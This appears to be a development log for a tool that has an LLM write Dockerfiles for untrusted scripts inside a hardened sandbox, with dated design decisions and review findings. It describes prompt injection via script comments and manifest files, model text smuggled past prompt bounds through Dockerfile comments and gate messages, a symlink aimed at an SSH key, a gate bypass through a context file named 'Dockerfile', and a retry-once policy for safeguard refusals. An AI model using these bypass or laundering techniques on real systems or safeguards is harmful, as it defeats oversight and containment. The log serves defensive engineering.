Timeout returns `exit_code=None` with `timed_out=True`. Nothing yet decides what a
timeout means for the verdict.

`--cpus` and `no-new-privileges` are still unverified by observation. Both appear in the
argv and have tests asserting that, which is a weaker claim than the five flags checked by observation.

## CI, added 2026-08-22
`.github/workflows/tests.yml` runs both suites on push to `main` and on pull requests.
The docker half is the reason it exists: GitHub's Linux runners ship a real daemon, so
the hardening flags stay checked on a machine that is not the development one. Steps are named
separately so a red build says which half broke.

Two consequences for later work. The suite must never need an API key, so the fake
LLM layer planned at the time is a CI requirement and not a convenience. And this is signal,
not enforcement: turning it into an actual gate needs branch protection on `main`, a
repository setting nobody has flipped yet.

## Refusal policy, decided 2026-08-23
The input is a script nobody trusts and the model has cybersecurity safeguards, so a
refusal is an expected outcome rather than an edge case. Decided:

Retry once, on a counter separate from the repair budget. The repair loop works because
each attempt carries new evidence; a refusal retry resends identical text and hopes the
sampler lands elsewhere, so letting the two share a counter spends repair attempts on
something repair cannot fix.

After a second refusal, stop asking and fall back to a Dockerfile we write ourselves. For
Python and Bash that needs no model, so a refusal never kills the run. A loop that keeps
asking after a refusal reads as a loop that asks until the classifier gives up, and the
repository is public.

Keep the reason. It arrives on the refusing response itself, `stop_details` on Anthropic
and `message.refusal` on OpenAI, so it costs no extra call. `Refused.reason` carries it as
a structure. It is recorded and shown beside the observed behaviour, labelled advisory.

It is never the verdict. The script under test is inside the prompt, so it writes part of
the text the model forms its opinion from: a hostile script can open with a comment
claiming to be a course exercise and buy itself a clean explanation. The one case where
the opinion is the whole story is when the fallback Dockerfile also fails to build, and
then the honest report is that no run happened and here is what the model said.

## Reviewed 2026-08-23 by a second model, and the plan changed
The question was whether this is an agent. It is not, by the usual definition: the model
fills in one artifact and never chooses what happens next. A peer project held up as the
counterexample turned out to have the same property, a fixed graph whose conditional edges
are plain Python, one tool offered only when a regex on the build log allows it.

What crosses the line is the model choosing which tools to call and when it has enough,
so the plan now builds that. The boundary stays where it is: the model gains agency over
what it learns, never over the gate, the sandbox flags, the decision to build or run, or
the verdict.

Five shapes have to be decided before the loop, because each is a rewrite otherwise:

1. A `Workspace` protocol behind the tools. Tools never see a path; a Workspace lists
   files by name and reads one bounded, populated by explicit ingestion, which is the
   single place symlinks are resolved or refused. The hosted service and a Kubernetes
   sandbox then become implementation swaps.
2. `Sandbox.build` takes a manifest rather than one script. Once a tool reveals a
   `requirements.txt`, the model writes `COPY requirements.txt` and the build fails on a
   file the context does not hold, so the tools would manufacture the failure and then
   spend repair attempts on it.
3. The trace is a flat log whose every record carries a provenance field: model, tool
   result, container output, or us. Without it a reader cannot tell which strings are
   attacker-influenced, and a browser rendering them guesses wrong.
4. `Outcome` slims to references and totals. It currently embeds raw request and response
   JSON per call, which is harmless at four calls and megabytes at fifteen turns.
5. The bound is a token budget, not a turn cap, with headroom reserved for the final
   forced call. Input tokens grow every turn, so a turn count measures nothing.

Two calls worth recording. The seam between the plain engine and LangGraph is the event
vocabulary, not the node topology, because a topology-shaped interface cannot be honoured
by a plain loop. And the semantic safety check stays outside the tool loop, on the script
alone: a sibling file is a better injection vehicle than the script, and an opinion formed
from a fixed input is comparable across runs while one formed from whatever the model
probed is not.

## Three bugs, found in review and fixed 2026-08-24
`base_image` never reached the gate. The gate is now a `Gate` Protocol taking the
dockerfile, the declared base image, and the set of filenames a `COPY` may name. All three
are passed rather than inferred, and `allowed_files` holds only the script today so the
manifest arriving later grows the set instead of changing the signature. Two
tests cover it, one asserting what the gate is handed and one where a gate catches a model
declaring `python:3.12-slim` while writing `FROM ubuntu:22.04`.

The fallback had no dead end on a failed build. Two refusals, fallback, gate passes, build
fails, and the loop set `dockerfile = None` and asked the model again, which the refusal
policy rules out. Worse, if the gate then rejected that model-written Dockerfile the run
reported it as our own fallback failing our own gate. All three fallback dead ends now go
through one `_dead_end` helper so they cannot drift apart again.

Evidence from a first-attempt unusable reply was computed and dropped, because there is no
previous Dockerfile and the opening template has no slot for it. There is now a third
template, `RETRY`, for the case where the reply was unusable but there is nothing to
correct. The test asserts the two prompts differ.

## The workspace
`envforge/workspace.py`. The only code in the project that handles a path.

Tools and the sandbox will ask for names and contents and never receive a path, so there
is no path left for anything to manipulate. Everything that can go wrong with a filesystem
happens once, at ingestion, rather than on every read. That is the whole design: a
`requirements.txt` beside an untrusted script was discovered rather than chosen, and
resolving it once and checking where it landed is a rule that holds forever, while
checking a path at each use is a rule that holds until somebody adds a use.

Three decisions worth naming:

1. Resolve first, then check containment. A prefix check on the joined path passes a
   `requirements.txt` symlinked to `~/.ssh/id_ed25519`, because the joined path is inside
   the directory and only the target is not.
2. The script and its siblings are treated differently. A symlinked script is followed,
   because the user named that file and following it is doing what they asked, and the
   root becomes wherever it actually lives. Siblings were discovered rather than named, so
   they may not resolve outside that root.
3. Siblings come from a fixed menu per language, held in the `LANGUAGES` table, rather
   than from a caller-supplied path or a pattern. Traversal has nothing to traverse.

`Files` holds contents rather than locations, which is what makes the later versions drop
in without touching a caller: an upload has no directory, and a build running as a
Kubernetes Job has no host filesystem to point at.

## The build context, taken as contents
`Sandbox.build` takes a mapping of names to contents instead of a `Path`, and `Agent.run`
takes a `Workspace` instead of a script path. The agent no longer receives a path at all,
and a test asserts that by reading the signature, because if a `Path` ever comes back the
second read comes back with it.

Three things landed together.

The script is read exactly once. Before this it was read twice, at `agent.py` for the
prompt and again by `shutil.copy` when the build context was assembled, so a file that
changed between them meant the model reviewed one script and the container ran another.
The test swaps the file on disk after `gather()` and asserts the build context still holds
the original bytes.

The build context can hold more than one file, so a manifest can be copied into an image.

`allowed_files` reaching the gate is the set the workspace actually gathered rather than a
hardcoded singleton, so a `COPY` may name the script and any manifest beside it and
nothing else. That is the rule that stops the model writing `COPY requirements.txt` for a
file the build cannot see, which the tool loop would otherwise have manufactured.

The sandbox refuses a name that is not a bare filename. The workspace only ever produces
bare names, so that is defence in depth rather than the guard that matters: the sandbox
writes those names into a directory and should not have to trust whoever handed them over.

A context file may not be named something the build itself interprets. Found in review
before this piece merged and verified against the daemon: the files loop runs after the
gated Dockerfile is written, so `{"Dockerfile": ...}` overwrote it and the container ran
instructions the gate never saw. Both `Dockerfile` and `dockerfile` built and ran, the
second because a case-insensitive filesystem collides them. Not a directory escape, a
complete bypass of the only check there is. `.dockerignore` is refused on the same
reasoning, and an empty name now raises `SandboxError` rather than `IsADirectoryError`.

Reaching it required a workspace holding a file with that name, which today is impossible
because the sibling menu is ours and the extension rule keeps a script called Dockerfile
out. It becomes reachable the moment the tool loop grows that menu, which is a plausible thing
to want.

A silent policy change worth naming: a script with a latin-1 comment used to run with
replacement characters, because the agent read with `errors="replace"`. There is one
reader now and it is strict, so such a script is refused at ingestion. Defensible, but a
decision rather than a consequence.

## The outcome, slimmed to totals
`Outcome` carries totals rather than payloads. It held every `Call`, and a `Call` holds the
full request and response JSON, which is harmless at four small calls and megabytes once a
tool loop runs fifteen turns, on the one event every consumer has to hold.

It now carries a `Usage` of call count and token totals, plus a `run_id`. The whole `Call`
rides the `wrote` event instead, where a consumer reads it and lets it go, which is what
the event stream was for. `run_id` is what ties the summary back to the bodies once they
are elsewhere.

The alternative was dropping the bodies until the trace module exists, which would have
thrown away the wire JSON the trace is being built to record.

Review correction, 2026-08-27: a 5.6 Sol review found that the `wrote` event carried a
`Call` but no `run_id`, and that the old eight-character ID could collide across long-lived
traces. `run_id` is now a full UUID, created before every terminal path including an
unsupported language, and carried on `wrote`. `Usage.calls` now counts every request sent,
including a refusal, while token totals remain limited to replies that returned usage.
Two new tests cover the full ID and the unsupported-language path. 207 tests pass.

That last sentence held for four days only. The budget piece below found that the failures
were the replies not returning a usage, so the totals now count every reply, and the
contrast between `calls` and tokens that this paragraph draws no longer exists.

The same review asked for raw request and response bodies on failed provider replies. That
needs the provider error types to retain wire data, so it is deferred explicitly to the trace module's design rather than half-built here.

## The event vocabulary
`envforge/events.py`. The kinds an engine may yield, and who wrote every string in
each one. `Event` checks both at construction, so an engine that invents `node_entered`
fails there rather than putting a record in the trace that nobody can label.

The closed set is the smaller half. The labels are the reason this had to happen before
the LangGraph port and before the trace: a reader cannot tell whether a string came from
us, the model, a container or the files the run was handed, and neither can the
trace module. Only the code that emits the event knows, so a label added later is a guess
dressed up as a record.

Authors are a set per string, not one value per event. Three of them made that
necessary rather than tidy. `gate_rejected` carries a Dockerfile that is the model's on
every path but one, since after two refusals the file we wrote ourselves goes through the
same gate and can be rejected there too. `gate_rejected` is our own sentence quoting the model's line
back at it, since the gate's reason includes the offending line verbatim. And the `call`
on `wrote` holds a request carrying our system prompt and the script, and a response
written by the model. One value on either would have been false, and picking the "least
trusted" one means ranking a model against a container, which has no honest answer.

The labels are declared per kind, so a kind's set is the union over every path that emits
it. `finished` is labelled `INPUT` because one of its emission sites names the language the
caller asked for, though the others do not. Coarse, and chosen: a table can be checked
and a label chosen at each emission cannot, and the point of a seam is that a second engine
has to honour it.

A fifth provenance was considered and refused here. Docker's own words on `exec_failed` are the
daemon quoting the model's ENTRYPOINT, so the untrusted author is the model and the daemon
is not a separate one. `TOOL` existed here with nothing emitting it, which the looking
tools later fixed: `looked` carries its slice as `TOOL` and `INPUT` together, because the
frame is ours and every character inside it is the sample's.

That held until the command line, which added `PROVIDER` for the provider's own error
text. The reasoning above is why: the daemon quoting the model is not a separate author,
and an SDK reporting its own failure is. Overloading `TOOL` for it would have made
`authors()` lie to the tool loop that is about to become `TOOL`'s real user.

The test that closes the loop reads `agent.py` with `ast` and asserts the kinds emitted
there are exactly the kinds declared. Construction covers one direction, a kind emitted
but never declared; this covers the other, a kind declared but never emitted. It asserts
each `Event(` call has a literal first argument, so a computed kind turns the check red
instead of quietly incomplete.

Nothing consumes the labels yet, which is the fair criticism of this piece. The answer is
that emission is the only place the answer exists, not that a consumer is imminent.

215 tests pass.

## The token budget
`envforge/budget.py`. The model spend is bounded in tokens, and `max_attempts` stays where
it is. Two currencies, two bounds: an attempt builds an image and runs a container, which
no count of tokens measures, while a count of attempts stops measuring the bill the moment
one attempt can take many turns.

A turn cap measures nothing on its own, because every turn resends everything before it.
The tool loop makes that sharp rather than theoretical: each file the model reads stays in the
conversation for every turn after it.

Part of the total is reserved and cannot be spent on looking around. `can_investigate`
asks with the reserve held back, `can_write` asks without it, and the gap between them is
the whole idea: investigation is worth nothing if there is not enough left afterwards to
turn it into a Dockerfile. Nothing calls `can_investigate` until the tool loop lands. It is here now
because a tool loop written against a turn counter is a rewrite later rather than an
argument, which is the test every one of the five shapes had to pass.

A spent budget fell back to the Dockerfile we write ourselves, exactly like a second
refusal. That changed on 30 August, below: it now ends the run, because a verdict no
judgment went into should not be reported as a success.

The estimate gates and the provider's numbers record. `estimate` errs high twice over, a
characters-per-token rate below the real one and a reply assumed to run to the output
ceiling, so the loop stops one call early rather than one call late. An overestimate is
never written into the ledger and refunded, because that pessimism compounds until the
budget is a turn cap wearing a different name. The ceiling half was an Anthropic truth only
when this was written, and stopped being one on 30 August, below.

`Budget` is frozen and holds no counters, so an `Agent` built once and run twice starts
each run at zero. A budget carrying its own spent total would let the first run quietly
bound the second, and a test drives the same agent twice to hold that.

## The tokens nobody was charging for, found before this piece merged
The budget was written first and reviewed before the loop used it, and the review found
that it could not bound anything. `Refused`, `Truncated` and `InvalidArguments` all raise
out of `llm.py` before any usage is recorded, so a reply we could not use cost tokens that
the ledger never saw.

Truncation is the case that matters. A truncated reply consumed the entire output ceiling,
which is what truncation means, so it is the most expensive reply there is and it was the
one charged at zero. A loop that kept truncating would have walked past the budget
forever.

`LLMError` now carries `input_tokens` and `output_tokens`, every raise site in both
providers reads the usage off the response it already has, and `validate` failures are
charged through a small wrapper because `validate` itself knows nothing about tokens. Zero
remains the default and now means one thing only: no reply reached us to read a usage off.

This does not reopen the trace deferral. That one is about keeping raw request and
response bodies for failed replies, which needs error types that retain wire data. Two
integers are not that.

## The bound that only bound one provider, 2026-08-30
A clean-context review of the branch found that `OpenAICompatLLM` sent no output ceiling.
Anthropic was sent `max_tokens` and the other two were sent nothing, while `estimate` added
`MAX_TOKENS` to every guess on the assumption that a reply cannot exceed it.

So on two providers out of three the assumption was simply false. One reply could run past
the whole budget before `can_write` got the chance to refuse the next call, and `Truncated`
had nothing to fire on, since truncation is the provider enforcing a ceiling we never sent.
The budget read as a bound and was one only under Anthropic.

Both OpenAI-compatible providers are now sent `max_completion_tokens`, which Groq's own
reference and OpenAI both document as the replacement for the deprecated `max_tokens`, and
which OpenAI's newer models require. A test asserts the ceiling is in the request for both,
and asserts the deprecated name is absent.

The lesson is the one this file keeps recording. The gap was disclosed honestly in three
places, ADR-015, the `budget.py` header and the entry above, and every one of them called
it a known gap in the estimate. None of them said the bound itself did not hold, which is
the sentence that would have made someone fix it.

232 tests pass.

## Prompts move to a module, decided 2026-08-25
Before the tool loop, and as `envforge/prompts.py` rather than as text files.

The reason is not tidiness and is not tool descriptions. A tool description is glued to its
JSON schema and the schema is code, so they change as a unit and stay together. The reason
is the failure this stage produced three times: the `/app` trap, the `--upgrade pip`
reflex and the missing `-y` were all the prompt describing the gate by hand while nobody
consulted the gate.

A module can import `INSTRUCTIONS`, `RUN_COMMANDS` and `RUN_FLAGS` and render the prompt's
lists from the gate's own constants, so that class of drift becomes impossible rather than
repeatedly fixed. A text file cannot. The limit is worth stating: derivation covers the
lists. The prose rules, the exec-form explanation and the `-y` build-time fact can still
drift, and nothing mechanical prevents it.

It must be a separate module rather than code inside `agent.py`, because `agent.py`
deliberately does not import `gate.py`: the `Gate` Protocol is local and the concrete gate
arrives as a constructor argument. `prompts.py` imports the gate constants and hands
`agent.py` finished strings, and the seam survives.

Deviation from CLAUDE.md, named rather than smuggled: it says prompts live as files
parameterised by language. This is one module and no per-language split, because nothing is
per-language yet. The gate is language-agnostic and the only per-language facts already
live in `LANGUAGES`. A split now is scaffolding for a tenant who has not arrived.

## The deterministic inspection layer, decided 2026-08-25
Proposed and accepted, closing the observability gap without the second model call Ben's design
uses. Accepted with two corrections.

It is a different thing rather than the same thing in a costume. Ben's intermediate is a
decision made visible, and its flaw is that the decision binds the step with more context.
This is evidence made visible, and evidence binds nothing. It is also the artifact the
trace's provenance field wants: records whose author is us.

The correction that matters: the proposal bundles two diffs of very different quality.
Manifest against the Dockerfile is sound, because both sides are package names, needs PEP
503 canonicalisation so `Flask` and `flask` do not read as a conflict, and is built first.
Imports against the manifest is not sound and never can be, because `cv2` and
`opencv-python-headless` are one dependency wearing two names. That half is two unmatched
lists a reader pairs by eye, and the word "conflict" never appears on it. A record that
calls an unmatched name a conflict is a record that lies, and it is the record an
interviewer asks to see.

The record is held back, never injected into the prompt. The strongest reason is not that
injecting recreates Ben's early binding, though it does. It is that a diff computed against
data we handed the model measures compliance rather than competence: agreement with a list
it never saw is evidence, and agreement with a list we gave it is nothing. Two more: our
list is incomplete by construction, since dynamic imports are exactly where `ast` fails, so
an anchored model gets worse precisely where reading beats parsing. And the tool loop's exit
ticket is a run where the model's investigation changed the outcome, which stops being
attributable to the tools if a digest was injected.

`ast.parse` executes nothing, the input is already bounded at 64KB by the workspace, and a
parse failure is data rather than an error path. Walk the whole tree rather than the top
level, since function-local imports are syntactically visible, and filter the standard
library or every `import os` becomes noise. The honest claim is "import statements present
in the source", never "what the script needs".

The bonus nobody was looking for: an unparseable `.py` is a deterministic witness for the
mislabel gap recorded above, catching a bash script labelled python at ingestion rather
than after a container run is spent on it. Whether that refuses or merely records will be
decided on real cases rather than in advance.

Not to be built, written down because the machinery makes it tempting: once a deterministic
manifest parser exists, a model-free fallback transcribing manifest lines into installs is
one afternoon away. Today's fallback installs nothing, so a refusal degrades a run. A
transcribing fallback would install attacker-named packages with no model involved, turning
refusal from degrade into escalate.

## Manifest policy, decided 2026-08-25 before any of it is built
The tools exist for one reason worth stating plainly: an import name is not a package name.
`import cv2` needs `opencv-python-headless`, and no amount of reading the script reveals
that while a `requirements.txt` states it. That single case is what makes the tools
load-bearing rather than decorative, and a run where the manifest changed the outcome is
the demo that work has to produce.

What a manifest is here. It sits beside the script, we never write it, a developer did, so
it is untrusted text exactly like the script. It is optional: only the script is required
and a run without a manifest proceeds normally. Our product remains the Dockerfile, so a
dependency the manifest states is expressed as a `RUN ["pip", "install", ...]` line rather
than by copying the file.

**One model call, not two.** Ben's project has an `identify_technologies` node producing a
base image and package lists before a separate node writes the Dockerfile. We keep one
call.

The reason has to be stated correctly, because the first version of it was wrong. It is
not that an intermediate summary discards information: his `generate_dockerfile` receives
the full script content alongside the identified packages, so nothing is lost. What
actually happens is that a decision is made early and then made binding. That node's system
prompt says "Use the provided base image", so a wrong identification cannot be corrected by
the step that has more context, and the `reasoning` field explaining the choice is dropped
from state entirely. Verified by reading `identify_technologies.py` and
`generate_dockerfile.py` rather than inferred from the graph.

The tool loop makes the question mostly moot anyway, because the model reads the manifest
instead of inferring from imports, which is a fact rather than a conclusion.

**When the manifest and the model disagree, the file wins.** Not because the file is more
trustworthy: it is the same untrusted text. Because somebody wrote it deliberately for this
project while the model is generalising from other projects, and explicit intent beats a
guess.

The exception is an import in the script with no corresponding line in the manifest. The
model adds it, because the file is silent rather than contradictory.

Every conflict is recorded and reported: the file said X, the model wanted Y, X was
installed. That record is also the evidence that the tools changed an outcome, which is
exactly what an interviewer will ask to see.

**A package the model believes is malicious does not stop anything.** It is written into
the report, shown to the user, and gates nothing, which is the same shape as the refusal
policy above.

Two reasons rather than one. The manifest is attacker-controlled text entering a prompt, so
a malicious package can arrive with a comment claiming it is an internal library. And
typosquatting is invisible to a well-intentioned model: `reqeusts` looks like nothing at
all.

What actually holds instead is already built. The gate refuses URLs, git references, local
paths and `--index-url`, so a package can only arrive by name from the default index.
Beyond that, containment is the container, which is the `pip install` argument in general,
and the real fix is the offline install after pre-resolution recorded in LATER.


## The model can look at the script now, 2026-09-01

The gap was arithmetic, and it had been in plain sight since the model layer was
built. `SCRIPT_LIMIT` is 8,192 characters. Most source files here are longer than that, and so is
the fixture this was built against: 16,980 characters, 8,788 of them replaced by a marker. On
any real script the Dockerfile was being written from roughly the first and last quarter
of a file.

That is not a bound anyone can drop. The script is attacker-controlled text on its way into
a prompt and it is resent on every repair. So the bound stays and the model gets to ask:
`search_script` for a literal string, `read_script` for a region by character offset.

**Why this passed the test for being a tool and the manifest did not.** Three questions:
can the whole thing simply go in the prompt, can anything but the model choose, and does
the choice change the outcome. Reading the middle of a truncated file fails the first
(the bound is the answer), passes the second (which region matters differs per script)
and passes the third. The dependency manifest fails the second outright. `requirements.txt`
was gathered from the first commit, went into every build context, and was never once
mentioned to the model: a file we had read, shipped to the daemon, and then asked the model
to guess the contents of. It is a fifteen-line prompt fix, and wrapping it in a tool would
have let the model decline to read a file we are certain it needs.

**The cap is a security control, not a budget.** Four looks per attempt, 2,048 characters
each. A model that asks for eight regions of a truncated script has reassembled the whole
file one slice at a time, and the bound on how much of the sample reaches a prompt is gone
without a single rule having been broken. With these two numbers a prompt holds at most
twice `SCRIPT_LIMIT` of the script and never all of it. It is enforced by taking the tools
out of the request rather than by telling the model to stop, because a rule written in a
prompt is a request made of the thing the prompt is defending against.

The arithmetic is stated over characters of the sample and not over the message, and the
first version of the comment got that wrong: our frame around each slice is a couple of
hundred characters more, and `bound` overshoots its own limit by the length of the marker
it leaves. A test written to the sloppy version failed, which is the only reason the
comment is now true.

**Three decisions with reasons that are not taste.**

Two tools rather than the one the plan called for. A strict schema requires every property
in `required`, so one tool covering both modes would force the model to supply a character
range while searching, or need an optional field typed as a union that our own validator
skips without saying so. The grammar constraint is worth more than the tidier menu.

The search pattern is a literal. It is chosen by a model that has just read
attacker-controlled text, and `re` on a model-chosen pattern is catastrophic backtracking
on the host doing the analysis, which is the one machine in this design not in a sandbox.
There is no safe way to accept a regex here and no reason to want one.

The assistant turn is stored exactly as the provider returned it rather than rebuilt from
the parsed arguments, because a reconstruction carries only the parts of a reply this code
models and loses the rest silently, one request before anything notices. The reason first
written here was that thinking blocks are on by default and must be replayed. A review
checked it: no `thinking` parameter is sent, so they are not on, and forced tool choice is
documented as incompatible with them anyway. The decision survives its own justification,
which is worth recording rather than quietly restating.

**What the model still cannot do.** It chooses what to read. It does not choose whether an
attempt is spent, whether the gate runs, whether anything is built, or how many attempts
remain. A look continues the conversation and costs no attempt; the loop is unchanged.

**The templates collapsed onto one context.** The truncation notice and the manifest have
to appear on a repair as well as on a first ask, and three copies of a paragraph is the
shape where the third copy goes missing. That shape is exactly what kept the manifest out
of the prompt in the first place, so the fix and the cause are the same edit.

`TOOL` finally has an emitter. `looked` carries its slice labelled `TOOL` and `INPUT`
together: the frame is ours, every character inside it is the sample's, and one value
could not have said that. `tool_capped` says out loud when the cap fires, because a bound
that never appears in the output is a bound nobody audits.

**The fixture, built before the fix and kept.** `examples/deep_dependency.py` is a 16,980
character log analyser whose only third-party import sits at character 11,110, inside the
8,788 characters `bound` discards, with the package named nowhere in the head or the tail.
Without a look the container builds cleanly and dies at runtime with `ModuleNotFoundError`,
which is terminal: the loop repairs build failures, and a script that ran and failed is a
finding rather than something to retry.

35 new tests, and every assertion in them was mutation-tested: the defect each one names
was applied to the source and the suite confirmed red before the test was believed. Two of
those mutations were wrong on the first pass, introducing a `NameError` rather than the
defect they claimed, so they proved a variable existed and nothing more. Redone as the real
defects, a per-run counter and a look that falls through into spending an attempt, they
were killed by exactly the tests that name them.

Two stale sentences were retired in the same change, both saying the `.env` allowlist holds
four variable names. It holds three, and has since the token budget was deleted and took
the fourth with it. Found by reading the invariant list while adding to it, which is the
argument for reading a record rather than appending to it.

### What the cold review changed, before this merged

A reader who had not written the code, given the repository and told to falsify the
claims rather than read them, broke the one that mattered most.

**Invariant 24 was false as written, and the channel was the previous Dockerfile.**
Everything untrusted is bounded on the way into a prompt, except that `previous` was not,
and `previous` is not reset between attempts. A model that writes what it read into
comment lines, which the gate permits, carries those slices into the next attempt and gets
a fresh look budget on top of them. Reproduced before fixing: 25,326 characters of a
40,000 character sample in one prompt, against a ceiling this repository claimed was
16,384, and growing linearly with `max_attempts`. Bounding `previous` at 2,048 brings the
same attack to 15,417.

The shape of the mistake is worth more than the fix. Every individual rule held. Four
looks per attempt, every slice bounded at the point of production, the tools withdrawn at
the cap. The bound was defeated by a path nobody had counted as a path, which is the third
time in this project that a rule checking the obvious channel missed the one beside it.

**The test named after that invariant could not fail.** It summed the offsets the tools
had printed about themselves and compared them to a constant, which reduced to
`16384 <= 16384`. It would have stayed green throughout the attack above, and it did: the
attack leaves all four looks correctly bounded. It now builds the real prompts and counts
how much of a sample of unique tokens appears in them.

**One mutant had survived.** Removing the bound in `look` left all 323 tests green.
`read_region` and `search` each cap the sample they return, so the line looks redundant,
and it is not: `search` echoes the model's own pattern, which is unbounded. A 300,000
character pattern reached the prompt. Both this and the laundering fix were mutation
tested afterwards and are killed by the tests that name them.

**Two numbers written in the same change were already stale.** ADR-018 said ten of sixteen
source files exceed the limit and that `agent.py` loses 18,866 characters. Both were true
of the commit before this one: the change itself pushed `events.py` over the limit and grew
`agent.py` by half again. A measurement written about a tree and not re-taken against the
tree it ships in.

Corrected once and stale again by the next commit, which is the actual lesson. The second
review caught the recount too, because fixing the blocker had grown `agent.py` further. A
number that moves whenever the file it describes is edited does not belong in a record, so
both now measure `examples/deep_dependency.py`, which exists to be measured and is never
edited.

**ADR-015's premise expired one change after it was written.** The token budget was deleted
because seven calls was the worst a run could make and could not approach the ceiling. The
worst case is now sixteen calls, which clears that 256,000 ceiling on any per-call
assumption worth making: 320,000 tokens on one and 348,000 on another. Sixteen and not the
fifteen the formula gives, because a refusal spends no attempt and is therefore a free
extra call. The first number here was derived and the second was driven, and only the
driven one was right. The token total is the softer of the two claims, since it depends on
an assumed input size per call, so the call count is what the argument should rest on.
The deletion stands, because `max_attempts` is still the bound that holds and it now caps
looks too, but "it cannot fire" is no longer the argument and the ADR says so.

**A justification was asserted rather than checked.** The reason given for storing the
provider's assistant turn verbatim was that thinking blocks are on by default and must be
replayed. No `thinking` parameter is sent, so they are not on, and forced tool choice is
documented as incompatible with them. Keeping the turn verbatim is still right, for the
duller reason that a reconstruction silently drops whatever this code does not model. The
decision survived; its stated reason did not, and replacing it was the point.

**`examples/` shipped outside the leak test.** The guard globs `*.md`, `envforge/*.py` and
`tests/*.py`, and its own docstring promises that a new record is covered the day it is
added. That was true per file and false per directory. A fixture is exactly the file
somebody pastes a real path or a real key into to make it realistic.

Two findings were left out of the branch and recorded with triggers instead: the loop has
no termination floor of its own and relies on the model layer refusing an unoffered tool
name, and a look can end a run indirectly by growing a prompt past the context window.
Neither is reachable with the providers that ship.

### The second blocker: the fourth channel

The same reviewer, given the fix, broke the restated invariant again. Bounding `previous`
closed one channel and there was another beside it.

`evidence` is set at four places. Three were bounded and the gate-rejection one was not,
and the gate's rejection reason quotes the whole offending line back so the model can fix
it. That line is written by the model. Measured: a single `WORKDIR` instruction carrying
200,000 characters put 202,705 characters into one repair prompt. As a laundering channel
it beat the restated ceiling too, at 24,160 characters of a 40,000 character sample against
22,528, and the ceiling is not really the point: the channel was bounded only by the
model's own output limit.

The comment on one of the three bounded sites already recorded this exact failure, in
those words, from a provider message. The same bug, on a different path, with its own
post-mortem written six lines above it.

Fixed in two places, and the source one is the real fix. The gate now caps the whole
Dockerfile at 8KB and truncates what any reason quotes to 200 characters, which closes it
where the string is created rather than at each place a reason is later used. That is the
argument invariant 25 already makes about tool results, applied one module over.

The consumption site is bounded too, and the reason is worth keeping. With the source cap
in place a mutation removing the `evidence` bound survived the whole suite, because the
shipped gate can no longer produce a long enough reason to notice. But `Gate` is a
Protocol: the reason is whatever the installed gate returns, and the agent's guarantee
about what enters a prompt must not depend on which gate someone wired in. The test that
kills that mutation now supplies a deliberately wordy gate.

That test was itself broken when first written, and passed nothing: the stub gate rejects
every attempt, so the run exhausted a reply queue sized for the happy path and the test
failed unconditionally. It was reported as killing all five mutations, which is the same
error as a test that cannot fail, wearing the opposite mask. Caught by checking that it
passed on a clean tree before believing what the sweep said about it.

Four record errors from the same pass, all the same shape. A paragraph in this file still
claimed in the present tense that seven calls is the worst a run can make, while the ADR
saying otherwise had been corrected 940 lines away: adding the correction elsewhere is not
retiring the false sentence. A comment in `agent.py` still said the attempt cap bounds
model calls at roughly seven. The worst case was written as fifteen, from
`max_attempts * (MAX_LOOKS + 1)`, and is sixteen, because a refusal spends no attempt and
is a free call; the token figure beside it had been measured on sixteen, so the derivation
and the measurement disagreed in the same sentence. And the recount of `agent.py`'s length
was stale again by the next commit, because fixing the blocker grew the file.

That last one is now fixed by not making the claim about a file that moves. Both records
measure `examples/deep_dependency.py` instead, which exists to be measured and is never
edited. A number that goes stale whenever someone edits the thing it describes is a
promise to be wrong later.

### The third pass, and one more test that could not fail

Signed off. Four attacker shapes against invariant 24, all within the ceiling, and no
fifth channel: every interpolation into a prompt is now bounded except the script's
filename, which is held down by the filesystem's 255-byte component limit rather than by
anything stated here. The manifest cannot accumulate, since those files are read once at
ingestion and never rewritten by the loop, and the retry path is covered because the same
bound catches both the unusable-reply message and the tool-name message.

Two of the three follow-ups were done rather than deferred, and the reason is worth
stating, because the standing rule is that non-blocking findings go to the deferred list
and never into the branch.

The first was a test written in this change that could not fail. The laundering fake on
the gate-rejection path smuggled only the current attempt's slices, and `history` resets
every attempt, so nothing accumulated: on a tree with all three caps removed it reached
21,726 against a ceiling of 22,528 and passed. Within 3.5% of proving something, and
proving nothing. Deferring that would mean shipping a test whose docstring claims a
property it cannot check, which is the precise failure this project has already paid for
more than once. The fake now banks across attempts, and the pre-fix tree was rebuilt to
confirm it: seven tests red there, this one among them, and green here.

That is the second time in one change that a new test had to be checked in both
directions. The rule that came out of it: run a new test on the clean tree and on the
broken tree, because green proves nothing on its own and red proves nothing on its own,
and the two failure modes look identical from inside a mutation sweep.

The second was `ARCHITECTURE.md` having no entry for the two gate caps. That file holds
the invariants, the caps are a security control added at the source, and invariant 25 is
the exact argument they were added on, so their absence was a record with something to say
and not saying it. Invariant 28 now carries them, including why the gate's 8KB and the
prompt's 2KB are deliberately different numbers answering different questions.

The third, a guard for `bound` at limits below two, is deferred with a trigger. `half =
limit // 2` is zero for a limit of one, and `text[-0:]` is the whole string, so the
function returns its entire input instead of bounding it. Unreachable today because every
limit in use is 2,048 or larger, and worth fixing the first time anyone passes a computed
limit rather than a constant, because `bound` is the one function five separate limits and
two invariants all rest on.

One number was softened rather than corrected. The worst-case token total was written as a
measurement and is a modelling choice: it depends on assumed input size per call, and the
same sixteen calls give 320,000 or 348,000 depending on that assumption. The call count is
the robust claim and the records now lean on it.

### The first live run, and what it exposed

The exit ticket was met on the first real run: the fixture fails on the previous commit
with `ModuleNotFoundError`, and succeeds with the tools, same command, same file. The
model installed `tabulate`, the script ran, exit 0.

It passed on luck, and that is the more useful result.

The model opened with `search_script("import")`, which is exactly the move the prompt asks
for. The search returned nothing it did not already have. There are eleven matches; the
tool showed the first five; all five sit between offsets 1318 and 1392, inside the 0-4096
head the model had already been given. The match that mattered was the eleventh, at 11,110.

So the look was wasted, and the model fell back to reading the middle in slices: three
`read_script` calls, finding the dependency in the last one before the cap withdrew the
tools. Had the dependency sat 1,000 characters further on, the run would have been capped
without ever reaching it and the ticket would have failed.

The cause is general rather than a property of this fixture. Imports cluster at the top of
a Python file, so "show the first N matches" systematically returns the region the model
has already read, for the most natural query in the most common language. The tool's own
description told the model that search is usually the cheaper first move, which the
evidence had just made false.

Fixed by returning the offset of every match as a bare list of integers, plus windows for
a few matches chosen spread across the file rather than taken from the front. Offsets are
what `read_script` takes, so the model can now search once and read exactly where the
search pointed. On the same query against the same fixture it now gets offset 11124 in the
list and a window containing `from tabulate import tabulate`, in one look rather than four
and a guess.

Worth naming why this was fixed rather than deferred, since the standing rule sends
